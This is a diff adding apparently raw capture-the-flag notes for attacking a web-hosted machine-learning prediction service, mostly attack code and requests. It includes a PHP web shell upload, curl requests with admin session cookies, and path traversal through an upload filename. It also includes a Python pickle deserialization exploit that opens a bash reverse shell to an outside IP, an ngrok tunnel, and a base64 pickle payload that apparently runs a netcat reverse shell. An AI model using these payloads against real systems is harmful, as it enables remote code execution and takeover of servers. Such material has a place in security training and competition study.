@@ -1,0 +1,98 @@
+Content-Disposition: form-data; name="file"; filename="./FL"
+Content-Type: application/x-httpd-php
+
+<?php echo shell_exec($_GET['cmd']); ?>
+
+Content-Disposition: form-data; name="file"; filename="./FL"
+Content-Type: application/x-httpd-php
+
+1,2,3,4
+1,2,3,4
+1,2,3,4
+1,2,3,4
+1,2,3,4
+1,2,3,4
+1,2,3,4
+1,2,3,4
+1,2,3,4
+1,2,3,4
+1,2,3,4
+1,2,3,4
+1,2,3,4
+1,2,3,4
+1,2,3,4
+1,2,3,4
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 46.101.107.117:2206' -H $'Content-Length: 238' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXAtqIT8CFYYLSDNv' -H $'Accept: */*' -H $'Origin: http://46.101.107.117:2206' -H $'Referer: http://46.101.107.117:2206/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
+    -b $'session=eyJpZCI6IjA5MTVjZjE3LWUxMDgtNGI3Zi05NWViLTRlZDNhM2RkMDY2OCIsInVzZXJuYW1lIjoiYWRtaW4ifQ.Ym60Lg.A7-RzD4nLh6YgEp7cqo6LG4xPdw' \
+    --data-binary $'------WebKitFormBoundaryXAtqIT8CFYYLSDNv\x0d\x0aContent-Disposition: form-data; name=\"ctf\"\x0d\x0a\x0d\x0aHE\x0d\x0a------WebKitFormBoundaryXAtqIT8CFYYLSDNv\x0d\x0aContent-Disposition: form-data; name=\"results\"\x0d\x0a\x0d\x0a52,43,45\x0d\x0a------WebKitFormBoundaryXAtqIT8CFYYLSDNv--\x0d\x0a' \
+    $'http://46.101.107.117:2206/predict'
+
+brute forcing the model with 2 characters didn't reveal anything.
+
+file format for models?
+ - csv
+ - json
+ - 
+
+gunicorn sendfile
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 46.101.107.117:2206' -H $'Content-Length: 10698' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://46.101.107.117:2206' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0rcakPJgPrvhgTtI' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Referer: http://46.101.107.117:2206/profile' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
+    -b $'session=eyJpZCI6ImNhNjA1MzNjLTUxM2YtNDA3OC1hNmQ4LTdmMWExOTc2ZTQzMiIsInVzZXJuYW1lIjoiYWRtaW4ifQ.Ym_MlQ.r6u73Baj68T16WuSVLjrU_KhKdI' \
+    --data-binary $'------WebKitFormBoundary0rcakPJgPrvhgTtI\x0d\x0aContent-Disposition: form-data; name=\"img\"; filename=\"../models/FL.png\"\x0d\x0aContent-Type: image/png\x0d\x0a\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a------WebKitFormBoundary0rcakPJgPrvhgTtI--\x0d\x0a' \
+    $'http://46.101.107.117:2206/profile-picture'
+
+    curl -i -s -k -X $'POST' \
+    -H $'Host: 46.101.107.117:2206' -H $'Content-Length: 10698' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://46.101.107.117:2206' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylQiqPTNplVO4XeqK' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Referer: http://46.101.107.117:2206/profile' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
+    -b $'session=eyJpZCI6ImNhNjA1MzNjLTUxM2YtNDA3OC1hNmQ4LTdmMWExOTc2ZTQzMiIsInVzZXJuYW1lIjoiYWRtaW4ifQ.Ym_MlQ.r6u73Baj68T16WuSVLjrU_KhKdI' \
+    --data-binary $'------WebKitFormBoundarylQiqPTNplVO4XeqK\x0d\x0aContent-Disposition: form-data; name=\"img\"; filename=\"../models/FL.png\"\x0d\x0aContent-Type: image/png\x0d\x0a\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a1,2,3,4\x0d\x0a------WebKitFormBoundarylQiqPTNplVO4XeqK--\x0d\x0a' \
+    $'http://46.101.107.117:2206/profile-picture'
+
+    profile-picture/ca60533c-513f-4078-a6d8-7f1a1976e432
+
+
+Content-Disposition: form-data; name="img"; filename="FL.png"
+Content-Type: application/json
+
+{
+[1,2,3]: [1,2,3],
+[2,3,4]: [2,3,4],
+[3,4,5]: [3,4,5],
+}
+
+[3.0,1.0,30.0,1.0,0.0,16.1]
+[3.0,0.0,22.0,0.0,0.0,9.8375]
+[2.0,0.0,45.0,1.0,1.0,26.25]
+[1.0,0.0,21.0,0.0,0.0,26.55]
+[3.0,1.0,16.0,4.0,1.0,39.6875]
+
+... none of this
+
+maybe pickle ... also there's exploits for pickle so this seems likely...
+
+import pickle
+import base64
+import os
+import subprocess
+
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('bash -i >& /dev/tcp/52.28.247.255/19865 0>&1')
+        return os.system, (cmd,)
+
+
+if __name__ == '__main__':
+    pickled = pickle.dumps(RCE())
+    print(base64.urlsafe_b64encode(pickled))
+
+ngrok tcp 9999
+
+
+../../../../../../../../../../../../tmp/0b8aa459-58fc-4274-985b-02491938b1de.png
+
+{
+"1": pickled=gASVdwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFxybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI-JjEgfCBuYyA2LnRjcC5ldS5uZ3Jvay5pbyAxOTg2NSA-IC90bXAvZpSFlFKULg==
+}
